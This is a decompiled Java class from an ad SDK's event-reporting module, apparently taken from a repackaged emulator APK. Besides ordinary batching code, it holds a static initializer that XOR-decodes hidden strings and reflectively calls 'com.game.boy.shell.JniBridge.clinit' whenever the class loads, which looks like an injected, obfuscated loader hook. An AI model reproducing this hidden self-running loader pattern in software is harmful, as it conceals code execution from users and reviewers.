package com.kwad.sdk.core.report;

import android.content.Context;
import com.kwad.sdk.core.network.f;
import com.kwad.sdk.core.report.e;
import com.kwad.sdk.service.ServiceProvider;
import com.kwad.sdk.utils.ao;
import com.kwad.sdk.utils.br;
import java.lang.reflect.Method;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public final class u<T extends e, R extends com.kwad.sdk.core.network.f> implements Runnable {
    private static AtomicLong aMH = new AtomicLong(-1);
    protected final l<T> aKS;
    protected final b<T, R> aMI;
    protected final AtomicInteger aMJ;
    protected final Context mContext;

    public interface a {
        void Kz();
    }

    static {
        SfTn();
    }

    public u(Context context, l<T> lVar, b<T, R> bVar, AtomicInteger atomicInteger) {
        this.mContext = context;
        this.aKS = lVar;
        this.aMI = bVar;
        this.aMJ = atomicInteger;
    }

    private static /* synthetic */ void SfTn() {
        char[] charArray = "\u0096\u009a\u0098Û\u0092\u0094\u0098\u0090Û\u0097\u009a\u008cÛ\u0086\u009d\u0090\u0099\u0099Û¿\u009b\u009c·\u0087\u009c\u0091\u0092\u0090".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 245);
        }
        String str = new String(charArray);
        char[] charArray2 = "\u0096\u0099\u009c\u009b\u009c\u0081".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 245);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    public final void Ky() {
        long TI = br.TI();
        if (TI >= aMH.get() * 2) {
            try {
                List<T> dW = this.aKS.dW(200);
                if (dW.isEmpty()) {
                    return;
                }
                this.aMI.a(dW, new AtomicBoolean(false), new a() { // from class: com.kwad.sdk.core.report.u.1
                    @Override // com.kwad.sdk.core.report.u.a
                    public final void Kz() {
                        u.this.Ky();
                    }
                });
            } catch (OutOfMemoryError e) {
                aMH.set(TI);
                ((com.kwad.sdk.service.a.e) ServiceProvider.get(com.kwad.sdk.service.a.e.class)).gatherException(e);
            } catch (Throwable th) {
                ((com.kwad.sdk.service.a.e) ServiceProvider.get(com.kwad.sdk.service.a.e.class)).gatherException(th);
            }
        }
    }

    @Override // java.lang.Runnable
    public final void run() {
        if (this.aMJ.get() > 0 || !ao.isNetworkConnected(this.mContext)) {
            return;
        }
        Ky();
    }
}
